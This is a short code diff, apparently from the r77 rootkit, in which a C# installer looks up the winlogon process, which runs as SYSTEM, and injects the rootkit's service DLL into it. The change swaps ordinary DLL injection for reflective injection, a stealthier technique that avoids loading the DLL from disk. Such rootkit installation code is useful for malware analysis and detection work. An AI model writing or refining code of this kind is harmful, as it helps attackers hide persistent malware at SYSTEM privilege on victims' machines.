@@ -43,7 +43,7 @@ public static class Program
 
 		// Inject the r77 service DLL into the a suitable process running under the SYSTEM user.
 		int processId = Process.GetProcessesByName("winlogon")[0].Id;
-		Inject.InjectDll(processId, payload);
+		Inject.InjectDllReflective(processId, payload);
 	}
 
 	private static byte[] Decompress(byte[] data)
